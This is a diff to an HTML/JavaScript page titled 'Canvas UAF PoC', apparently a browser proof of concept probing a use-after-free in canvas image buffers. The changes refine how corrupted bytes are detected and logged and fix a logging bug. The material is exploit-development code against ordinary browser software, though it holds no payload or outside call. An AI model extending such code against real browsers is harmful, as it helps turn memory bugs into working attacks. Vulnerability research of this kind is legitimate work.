@@ -32,7 +32,7 @@
 </head>
 <body>
     <h1>Canvas UAF PoC</h1>
-    <p>Click to test UAF (0x46 to 0x48).</p>
+    <p>Click to test UAF.</p>
     <button id="trigger">TEST UAF</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
@@ -80,26 +80,27 @@
                 let differenceCount = 0;
                 let startOffset = -1;
                 let endOffset = -1;
-                const newValues = new Set(); // Track unique new values
+                const changes = new Map(); // Track original -> new values
 
                 // Compare first 4096 bytes, merge into one range
                 for (let i = 0; i < Math.min(original.length, 4096); i++) {
                     try {
                         if (originalCopy[i] !== current[i]) {
                             differenceCount++;
-                            newValues.add(current[i]);
+                            const key = `0x${originalCopy[i].toString(16).padStart(2, '0')}->0x${current[i].toString(16).padStart(2, '0')}`;
+                            changes.set(key, (changes.get(key) || 0) + 1);
                             if (startOffset === -1) startOffset = i;
                             endOffset = i;
                         }
                     } catch (e) {
-                        return { detected: true, differenceCount, range: null, newValues: [], error: `Access error at offset ${i}: ${e.message}` };
+                        return { detected: true, differenceCount, range: null, changes: [], error: `Access error at offset ${i}: ${e.message}` };
                     }
                 }
 
                 const range = (startOffset !== -1 && endOffset !== -1) ? { start: startOffset, end: endOffset } : null;
-                return { detected: differenceCount > 0, differenceCount, range, newValues: [...newValues], error: null };
+                return { detected: differenceCount > 0, differenceCount, range, changes: [...changes], error: null };
             } catch (e) {
-                return { detected: true, differenceCount: 0, range: null, newValues: [], error: e.message };
+                return { detected: true, differenceCount: 0, range: null, changes: [], error: e.message };
             }
         }
 
@@ -113,7 +114,7 @@
                 const refImageData = ctx.createImageData(512, 512);
                 const refView = new Uint8Array(refImageData.data.buffer);
                 for (let i = 0; i < refView.length; i++) {
-                    refView[i] = 0x46;
+                    refView[i] = 0x46; // Can be changed (e.g., 0x41)
                 }
 
                 // Intensive drawing
@@ -135,7 +136,7 @@
                             log(`${result.differenceCount} bytes changed`);
                             if (result.range) {
                                 log(`Changed range: Offsets ${result.range.start}-${result.range.end}`);
-                                log(`New values: ${result.newValues.map(v => `0x${v.toString(16).padStart(2, '0')}`).join(', ')}`);
+                                log(`Changes: ${result.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                             }
                         } else {
                             status.textContent += `\nUAF occurred, no bytes checked`;
@@ -155,8 +156,8 @@
                                 status.textContent += `\n${secondResult.differenceCount} bytes changed`;
                                 log(`${secondResult.differenceCount} bytes changed`);
                                 if (secondResult.range) {
-                                    log(`Changed range: Offsets ${secondResult.range.start}-${secondResult.end}`);
-                                    log(`New values: ${secondResult.newValues.map(v => `0x${v.toString(16).padStart(2, '0')}`).join(', ')}`);
+                                    log(`Changed range: Offsets ${secondResult.range.start}-${secondResult.range.end}`);
+                                    log(`Changes: ${secondResult.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                                 }
                             } else {
                                 status.textContent += `\nUAF occurred, no bytes checked`;
